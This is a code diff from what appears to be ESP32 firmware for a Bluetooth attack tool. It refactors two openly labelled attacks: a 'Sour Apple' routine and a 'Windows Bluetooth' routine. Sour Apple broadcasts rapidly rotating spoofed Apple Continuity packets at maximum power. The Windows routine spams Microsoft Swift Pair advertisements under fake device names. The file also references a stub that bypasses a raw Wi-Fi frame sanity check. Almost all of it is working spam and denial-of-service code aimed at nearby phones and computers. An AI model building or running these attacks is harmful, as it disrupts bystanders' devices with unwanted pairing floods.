@@ -11,51 +11,53 @@ extern "C" int ieee80211_raw_frame_sanity_check(int32_t arg, int32_t arg2, int32
 }
 
 NimBLEAdvertisementData getSourAppleData() {
-  NimBLEAdvertisementData randomAdvertisementData = NimBLEAdvertisementData();
-  uint8_t packet[17];
-  uint8_t i = 0;
+  static const uint8_t types[] = {0x27, 0x09, 0x02, 0x1e, 0x2b, 0x2d, 0x2f, 0x01, 0x06, 0x20, 0xc0};
+  static uint8_t packet[17] = {16, 0xFF, 0x4C, 0x00, 0x0F, 0x05, 0xC1};
+  
+  packet[7] = types[esp_random() % 11];
+  esp_fill_random(&packet[8], 3);
+  packet[11] = 0x00;
+  packet[12] = 0x00; 
+  packet[13] = 0x10;
+  esp_fill_random(&packet[14], 3);
+  
+  NimBLEAdvertisementData adData;
+  adData.addData(packet, 17);
+  return adData;
+}
 
-  packet[i++] = 16;
-  packet[i++] = 0xFF;
-  packet[i++] = 0x4C;
-  packet[i++] = 0x00;
-  packet[i++] = 0x0F;
-  packet[i++] = 0x05;
-  packet[i++] = 0xC1;
-  const uint8_t types[] = {0x27, 0x09, 0x02, 0x1e, 0x2b, 0x2d, 0x2f, 0x01, 0x06, 0x20, 0xc0};
-  packet[i++] = types[rand() % sizeof(types)];
-  esp_fill_random(&packet[i], 3);
-  i += 3;
-  packet[i++] = 0x00;
-  packet[i++] = 0x00;
-  packet[i++] = 0x10;
-  esp_fill_random(&packet[i], 3);
-
-  randomAdvertisementData.addData(packet, 17);
-  return randomAdvertisementData;
+void sourAppleTask(void* param) {
+  NimBLEDevice::init("");
+  esp_ble_tx_power_set(ESP_BLE_PWR_TYPE_DEFAULT, ESP_PWR_LVL_P9);
+  esp_ble_tx_power_set(ESP_BLE_PWR_TYPE_ADV, ESP_PWR_LVL_P9);
+  
+  NimBLEServer *pServer = NimBLEDevice::createServer();
+  NimBLEAdvertising* pAdvertising = pServer->getAdvertising();
+  
+  pAdvertising->setMinInterval(0x20);
+  pAdvertising->setMaxInterval(0x20);
+  
+  while (sourAppleActive) {
+    pAdvertising->stop();
+    pAdvertising->setAdvertisementData(getSourAppleData());
+    pAdvertising->start();
+    delay(100);
+  }
+  
+  pAdvertising->stop();
+  NimBLEDevice::deinit();
+  vTaskDelete(NULL);
 }
 
 void startSourApple() {
   if (sourAppleActive) return;
-  NimBLEDevice::init("");
-  esp_ble_tx_power_set(ESP_BLE_PWR_TYPE_DEFAULT, ESP_PWR_LVL_P9);
-  esp_ble_tx_power_set(ESP_BLE_PWR_TYPE_ADV, ESP_PWR_LVL_P9);
-  esp_ble_tx_power_set(ESP_BLE_PWR_TYPE_SCAN, ESP_PWR_LVL_P9);
-
-  NimBLEServer *pServer = NimBLEDevice::createServer();
-  pAdvertising = pServer->getAdvertising();
-  if (!pAdvertising->start()) {
-    Serial.println("[ERROR] Failed to start BLE advertising");
-    return;
-  }
   sourAppleActive = true;
+  xTaskCreate(sourAppleTask, "SourApple", 8192, NULL, 5, NULL);
   Serial.println("Rapid Sour Apple attack started");
 }
 
 void stopSourApple() {
   if (!sourAppleActive) return;
-  pAdvertising->stop();
-  NimBLEDevice::deinit();
   sourAppleActive = false;
   Serial.println("Sour Apple attack stopped");
 }
@@ -78,7 +80,7 @@ NimBLEAdvertisementData getWindowsBluetoothData() {
     0x03, 0x00, 0x80, // Microsoft Beacon, Subtype, Swift Pair flag
     0x00 // RSSI
   };
-  advertisementData.addData(std::string((char*)swiftPairPayload, sizeof(swiftPairPayload)));
+  advertisementData.addData(swiftPairPayload, sizeof(swiftPairPayload));
 
   return advertisementData;
 }
@@ -87,12 +89,19 @@ void windowsBluetoothTask(void* param) {
   Serial.println("Rapid Windows Bluetooth attack task started");
   
   NimBLEDevice::init("");
+  
+  NimBLEAdvertising* pAdvertising = NimBLEDevice::getAdvertising();
+  if (!pAdvertising) {
+    Serial.println("Failed to get advertising object");
+    vTaskDelete(NULL);
+    return;
+  }
+  
   esp_ble_tx_power_set(ESP_BLE_PWR_TYPE_DEFAULT, ESP_PWR_LVL_P9);
   esp_ble_tx_power_set(ESP_BLE_PWR_TYPE_ADV, ESP_PWR_LVL_P9);
   
-  NimBLEAdvertising* pAdvertising = NimBLEDevice::getAdvertising();
-  pAdvertising->setMinInterval(0x20); // 20ms
-  pAdvertising->setMaxInterval(0x30); // 30ms
+  pAdvertising->setMinInterval(0x20);
+  pAdvertising->setMaxInterval(0x30);
 
   const char* deviceNames[] = {
     "Surface Headphones", "Surface Earbuds", "Xbox Controller",
@@ -101,23 +110,22 @@ void windowsBluetoothTask(void* param) {
   };
 
   while (windowsBluetoothActive) {
-    // 1. Set a new random MAC address
-    NimBLEAddress newAddr(esp_random(), true);
-    NimBLEDevice::setDeviceAddress(newAddr);
-
-    // 2. Set new advertisement data
+    // Stop any existing advertisement
+    pAdvertising->stop();
+    delay(50);
+    
+    // Set new advertisement data
     NimBLEAdvertisementData adData = getWindowsBluetoothData();
-    String deviceName = deviceNames[rand() % 9];
+    String deviceName = deviceNames[esp_random() % 9];
     adData.setName(deviceName.c_str());
     pAdvertising->setAdvertisementData(adData);
 
-    // 3. Advertise for a short duration
-    pAdvertising->start(100, nullptr); // Advertise for 100ms
-    delay(110); // Wait a bit longer than the advertisement duration
+    // Start advertisement
+    pAdvertising->start();
+    delay(200);
   }
 
   pAdvertising->stop();
-  NimBLEDevice::deinit(true);
   Serial.println("Windows Bluetooth attack task stopped");
   vTaskDelete(NULL);
 }
@@ -126,7 +134,7 @@ void startWindowsBluetooth() {
   if (windowsBluetoothActive) return;
   windowsBluetoothActive = true;
   // Create a new task for the attack to run continuously in the background
-  xTaskCreate(windowsBluetoothTask, "WinBTSpam", 4096, NULL, 5, NULL);
+  xTaskCreate(windowsBluetoothTask, "WinBTSpam", 8192, NULL, 5, NULL);
 }
 
 void stopWindowsBluetooth() {
